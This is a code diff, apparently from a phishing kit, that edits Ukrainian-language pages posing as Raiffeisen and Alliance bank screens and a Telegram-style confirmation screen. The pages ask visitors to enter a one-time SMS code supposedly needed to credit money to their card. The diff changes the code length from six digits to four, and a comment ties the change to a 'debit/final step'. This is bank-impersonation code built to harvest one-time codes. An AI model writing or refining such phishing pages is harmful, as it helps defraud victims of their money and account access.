@@ -1009,7 +1009,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="raiff-main-title">Останній крок</h2>
                 <p class="raiff-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}">
-                    ${Array(6).fill('<input type="tel" class="raiff-code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
+                    ${Array(4).fill('<input type="tel" class="raiff-code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                  ${options.error ? `<p class="raiff-error-text">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" id="raiff-resend-info" style="margin-top: 20px;">Надіслати код повторно</p>
@@ -1056,7 +1056,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="alliance-main-title">Останній крок</h2>
                 <p class="alliance-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin: 0 auto 25px auto; max-width: 350px;">
-                    ${Array(6).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
+                    ${Array(4).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                 ${options.error ? `<p class="raiff-error-text" style="color: var(--danger-color); text-align: center; font-weight: 500;">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" style="margin-top: 20px; text-align: center; color: var(--alliance-text-secondary); cursor: pointer;">Надіслати код повторно</p>
@@ -1298,7 +1298,7 @@ document.addEventListener('DOMContentLoaded', () => {
             header: 'Підтвердження', title: 'Останній крок',
             instructionText: 'Для зарахування коштів на вашу картку введіть одноразовий SMS код',
             resendText: 'Відправити SMS ще раз', screenId: 'telegram_sms', error: options.error,
-            codeLength: 6
+            codeLength: 4 // FIX: Changed from 6 to 4 for debit/final step
         });
     }
     function renderForgotPasswordFlow(step, options = {}) {
